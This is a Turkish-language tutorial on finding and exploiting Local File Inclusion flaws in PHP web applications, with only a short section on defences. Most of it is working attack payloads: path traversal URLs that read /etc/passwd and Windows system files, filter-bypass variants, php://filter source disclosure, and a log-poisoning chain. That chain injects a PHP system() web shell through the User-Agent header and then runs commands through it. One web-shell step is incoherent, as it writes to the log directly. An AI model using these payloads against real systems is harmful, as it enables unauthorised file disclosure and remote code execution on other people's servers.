# LFI (Local File Inclusion) Zafiyeti Tespit ve İstismar Rehberi

## İçindekiler
1. [LFI Nedir?](#lfi-nedir)
2. [LFI Zafiyetinin Tespiti](#lfi-zafiyetinin-tespiti)
    - [Basit Testler](#basit-testler)
    - [Dosya Dahil Etme Denemeleri](#dosya-dahil-etme-denemeleri)
3. [LFI Zafiyetinin İstismarı](#lfi-zafiyetinin-istismarı)
    - [Kritik Dosyalara Erişim](#kritik-dosyalara-erişim)
    - [Log Zehirleme (Log Poisoning)](#log-zehirleme-log-poisoning)
    - [PHP Wrapper Kullanımı](#php-wrapper-kullanımı)
    - [Path Traversal Teknikleri](#path-traversal-teknikleri)
    - [Web Shell Yükleme](#web-shell-yükleme)
4. [LFI Korunma Yöntemleri](#lfi-korunma-yöntemleri)
5. [Kullanışlı Komutlar ve Referanslar](#kullanışlı-komutlar-ve-referanslar)

---

## LFI Nedir?

**LFI (Local File Inclusion)**, saldırganların bir uygulamanın sunucusunda yerel dosyaları okumasına, çalıştırmasına veya başka yollarla istismar etmesine olanak tanıyan bir web uygulaması zafiyetidir. Genellikle, dosya içeriklerini kullanıcı girdisine dayalı olarak dahil eden PHP uygulamalarında görülür.

---

## LFI Zafiyetinin Tespiti

### Basit Testler
LFI zafiyetini tespit etmek için aşağıdaki gibi giriş değerleri kullanılabilir:

```http
http://target.com/index.php?page=../../../../etc/passwd
http://target.com/index.php?page=../../../var/log/apache2/access.log
```

Test sırasında aşağıdaki göstergelere dikkat edilmelidir:
- Sunucunun hata döndürmesi (500 Internal Server Error).
- Dosya içeriği görünüyorsa zafiyet mevcuttur.

### Dosya Dahil Etme Denemeleri
Dosya içeriklerinin başarılı bir şekilde çağrılabildiğini doğrulamak için şu dosyalar kullanılabilir:

- **Linux Sistem Dosyaları**:
  - `/etc/passwd`
  - `/proc/self/environ`
  - `/var/log/apache2/access.log`

- **Windows Sistem Dosyaları**:
  - `C:\Windows\System32\drivers\etc\hosts`
  - `C:\Windows\win.ini`

---

## LFI Zafiyetinin İstismarı

### Kritik Dosyalara Erişim
**Linux**
```bash
http://target.com/index.php?page=../../../../etc/passwd
```

**Windows**
```bash
http://target.com/index.php?page=../../../../windows/system32/drivers/etc/hosts
```

### Log Zehirleme (Log Poisoning)
Log dosyalarına kötü amaçlı kod yerleştirerek shell elde etmek için kullanılır.

1. **Log Dosyasını Belirleme**:
   ```bash
   http://target.com/index.php?page=../../../../var/log/apache2/access.log
   ```

2. **Log Zehirleme Örneği**:
   Terminalden aşağıdaki komutla zararlı kod eklenir:
   ```bash
   curl "http://target.com" -A "<?php system($_GET['cmd']); ?>"
   ```

3. **Shell Elde Etme**:
   ```bash
   http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
   ```

### PHP Wrapper Kullanımı
Base64 veya filtreleme yöntemlerini bypass etmek için PHP wrapper'lar kullanılabilir.

```bash
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Base64 ile dönen çıktıyı decode edin:
```bash
echo "Base64Kod" | base64 -d
```

### Path Traversal Teknikleri
Path traversal ile `/etc/passwd` gibi dosyalara erişim için farklı yollar denenebilir:

```bash
http://target.com/index.php?page=....//....//....//etc/passwd
http://target.com/index.php?page=....//....//var/log/apache2/access.log
```

### Web Shell Yükleme
1. **Log Poisoning Yöntemiyle**:
   ```bash
   echo "<?php system($_GET['cmd']); ?>" >> /var/log/apache2/access.log
   ```
   Shell çağırma:
   ```bash
   http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
   ```

2. **PHP Kodlarını Dahil Etme**:
   ```bash
   http://target.com/index.php?page=/tmp/php-shell.php
   ```

---

## LFI Korunma Yöntemleri
1. **Kullanıcı Girdisini Doğrulayın**:
   - Kullanıcı girdilerini sanitize ederek path traversal engellenebilir.

2. **Dosya Dahil Etmeyi Sınırlandırın**:
   - Sabit whitelist değerleri kullanarak yalnızca izin verilen dosyalar dahil edilmelidir.

3. **PHP `open_basedir` Kullanımı**:
   - PHP'nin erişebileceği dizinleri sınırlayın.

4. **Hataları Gizleyin**:
   - PHP hatalarını gizleyerek saldırganların bilgi toplamasını zorlaştırın.

---

## Kullanışlı Komutlar ve Referanslar

| Komut | Açıklama |
|-------|----------|
| `curl` | HTTP isteği gönderir. |
| `base64` | Base64 kodlaması çözer. |
| `wget` | Uzaktan dosya indirir. |

---

**Referanslar**:
- [OWASP LFI Cheat Sheet](https://owasp.org/www-project-cheat-sheets/)
- [PayloadAllTheThings - LFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
